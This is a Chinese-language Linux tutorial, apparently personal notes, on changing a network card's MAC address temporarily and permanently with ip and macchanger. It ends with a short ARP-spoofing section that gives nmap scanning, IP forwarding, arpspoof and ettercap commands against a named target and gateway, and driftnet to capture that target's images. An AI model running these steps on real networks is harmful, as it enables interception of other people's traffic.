# Linux 上的 MAC 地址欺骗

https://linux.cn/article-2793-1.html



## 什么是mac地址

> 网卡生产商在每一张网卡（NIC）在出厂时都会在上面刻上一个48位的全球唯一标识符（GUID，例如08:4f:b5:05:56:a0)

所以mac地址为`确定一张网卡的身份`但用户可以改变它，这就是传说中的“`MAC 地址欺骗`”。

## 怎么临时性地改变 MAC 地址？

## 1 方法一：`iproute2`

```
sudo ip link set dev eth0(网卡) down

sudo ip link set dev eth0 address 00:00:00:00:00:01

sudo ip link set dev eth0 up 
```
![](img/1.png)

## 方法二：`macchanger`

### 另一个方法是通过 macchanger (a.k.a., the GNU MAC Changer)。它有一些方便的功能，比如改变 MAC 地址以匹配某个运营商，或者完全随机化地址。



>在 Debian，Ubuntu 或 Linux Mint 下安装 macchanger：

         sudo apt-get install macchanger 


>在 Fedora 下安装 macchanger：

        sudo yum install macchanger 

> 在 CentOS 或 RHEL 下安装 macchanger：

```
$ wget http://ftp.club.cc.cmu.edu/pub/gnu/macchanger/macchanger-1.6.0.tar.gz
$ tar xvfvz macchanger-1.6.0.tar.gz
$ cd macchanger-1.6.0 
$ ./configure
$ make
$ sudo make install 
```

仅仅改变 MAC 地址：

```
$  macchanger --mac=00:00:00:00:00:01 eth0 
```
在保证 OUI 一致的情况下为 MAC 设置一个随机地址：
```
$  macchanger -e eth0 (网卡)
```
为 MAC 设置一个完全随机的地址：
```
$  macchanger -r eth0 (网卡)
```
![](img/2.png)


获取所有网卡的 MAC 地址，然后只列出指定的厂商（比如 Juniper）:
```
$ macchanger -l | grep -i juniper 
```

> 显示一块网卡原来的 MAC 地址和伪装的 MAC 地址：
```
$ macchanger -s eth0
Current MAC: 56:95:ac:ee:6e:77 (unknown) 
Permanent MAC: 00:0c:29:97:68:02 (Vmware, Inc.)
```

## 如何永久性地改变 MAC 地址？

如果你想在系统重启后还保持伪装 MAC 地址，你需要编辑配置文件。比如你想改变 eth0 的 MAC 地址，按以下方法搞起：

## 在 Fedora，CentOS 或 RHEL 下：

```
sudo vi /etc/sysconfig/network-scripts/ifcfg-ens33
DEVICE=ens33
MACADDR=00:00:00:00:00:01
```

或者你可以建一个开机启动的脚本放在 /`etc/NetworkManager/dispatcher.d` 目录下，前提是你使用 `Network Manager 管理你的网络。`这里假设你已经装了 macchanger，脚本内容如下：


```
sudo vi /etc/NetworkManager/dispatcher.d/000-changemac
#!/bin/bash
 
case "$2" in
    up)
        macchanger --mac=00:00:00:00:00:01 "ens33"
        ;;
esac
```

### 在 Debian，Ubuntu 或 Linux Mint 下：

新建一个开机启动脚本，放在 /etc/network/if-up.d/ 目录下：

```
sudo vi /etc/network/if-up.d/changemac 
#!/bin/sh
 
if [ "$IFACE" = eth0 ]; then
  ip link set dev "$IFACE" address 00:00:00:00:00:01
fi
```
顺手再给个权限

```
sudo chmod 755 /etc/network/if-up.d/changemac 
```


# ARP 攻击

## ARP欺骗方法

>nmap扫描内网主机
```
nmap -sP 192.168.0.0/24
查看目标主机操作系统信息
```
```
nmap -O 192.168.0.133
开启流量转发功能
```
```
echo 1 >> /proc/sys/net/ipv4/ip_forward
```
`使用arpspoof或ettercap`，`选一个进行arp欺骗。获取从192.168.0.1（路由器） 到 192.168.0.21（目标机）的流量。`



使用arpspoof（`无线网络下，有线网络则先ip，后网关`）：
```
arpspoof -i eth0 -t 192.168.1.1(网关) 192.168.1.*(ip)
```
```
arpspoof -i eth0 -t 192.168.0.1  192.168.0.21
```
>使用`ettercap`：
```
ettercap -T -q -M ARP /192.168.0.21（目标ip）//网关 ///
```
driftnet图片流量监控

driftnet -i eth0















